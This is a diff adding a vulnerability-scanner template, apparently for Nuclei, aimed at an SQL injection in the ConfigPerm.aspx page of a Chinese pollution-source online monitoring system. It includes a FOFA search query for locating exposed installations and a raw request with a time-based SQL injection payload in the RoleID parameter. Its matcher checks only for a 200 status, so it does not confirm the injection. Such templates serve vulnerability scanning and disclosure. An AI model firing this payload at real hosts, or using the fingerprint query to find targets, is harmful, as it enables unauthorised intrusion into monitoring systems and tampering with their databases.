@@ -1,0 +1,19 @@
+id: poc-firgmc4tf67iq562
+info:
+  name: 污染源在线监控系统ConfigPerm存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/firgmc4tf67iq562'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: firgmc4tf67iq562
+    fofa: body="ImgGwry/download.png" || (body="images/errorpage.gif" && body="错误页面") || body="污染源在线监控系统"
+http:
+- raw:
+  - GET /Admin/System/Role/ConfigPerm.aspx?action=GetSelPerm&RoleID=1%27;waitfor%20delay%20%270:0:5%27-- HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
